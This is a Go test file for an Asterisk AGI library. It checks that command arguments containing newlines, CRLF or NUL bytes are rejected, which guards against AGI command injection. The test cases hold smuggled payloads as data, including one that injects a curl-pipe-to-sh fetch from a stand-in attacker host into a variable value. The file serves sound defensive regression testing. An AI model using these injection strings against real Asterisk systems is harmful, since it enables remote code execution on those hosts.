package agi

import (
	"bytes"
	"errors"
	"strings"
	"testing"
)

// TestCommandRejectsProtocolDelimiters pins the fix for AGI command
// injection: an argument containing a line break or NUL byte must be
// rejected before anything reaches the AGI transport, otherwise it is
// framed as one or more additional, attacker-chosen AGI commands
// (e.g. "EXEC System <shell command>" on the Asterisk host).
func TestCommandRejectsProtocolDelimiters(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		args []string
	}{
		{
			name: "newline in variable value injects EXEC System",
			args: []string{"SET VARIABLE", "GREETING_NAME", "Voicemail User\nEXEC System curl -s http://attacker.example/pwn.sh | sh"},
		},
		{
			name: "carriage return line feed in variable value",
			args: []string{"SET VARIABLE", "GREETING_NAME", "user\r\nEXEC System pwn"},
		},
		{
			name: "NUL byte in variable value",
			args: []string{"SET VARIABLE", "GREETING_NAME", "user\x00EXEC System pwn"},
		},
		{
			name: "newline in EXEC application name",
			args: []string{"EXEC", "System\nHANGUP", "id"},
		},
		{
			name: "newline in record file name",
			args: []string{"RECORD FILE", "/tmp/greeting\x0aEXEC System pwn", "wav", "#"},
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			var w bytes.Buffer
			a := New(strings.NewReader("\n"), &w)

			resp := a.Command(tt.args...)

			if !errors.Is(resp.Error, ErrInvalidArgument) {
				t.Fatalf("expected ErrInvalidArgument, got %v", resp.Error)
			}
			if w.Len() != 0 {
				t.Fatalf("expected nothing written to the AGI transport, got %q", w.String())
			}
		})
	}
}

func TestCommandAcceptsCleanArguments(t *testing.T) {
	t.Parallel()

	var w bytes.Buffer
	// Constructed directly: NewWithEAGI's env scanner buffers ahead over the
	// same reader, which would consume the queued response before Command reads it.
	a := &AGI{Variables: make(map[string]string), r: strings.NewReader("200 result=1\n"), w: &w}

	if err := a.Set("GREETING_NAME", "Voicemail User"); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got, want := w.String(), "SET VARIABLE GREETING_NAME Voicemail User\n"; got != want {
		t.Fatalf("wrote %q, want %q", got, want)
	}
}

// Verbose is the one API that pre-escapes its argument (strconv.Quote); it
// must keep working for messages containing line breaks.
func TestVerboseEscapesLineBreaks(t *testing.T) {
	t.Parallel()

	var w bytes.Buffer
	a := &AGI{Variables: make(map[string]string), r: strings.NewReader("200 result=0\n"), w: &w}

	if err := a.Verbose("multi\nline message", 1); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got, want := w.String(), `VERBOSE "multi\nline message" 1`+"\n"; got != want {
		t.Fatalf("wrote %q, want %q", got, want)
	}
}
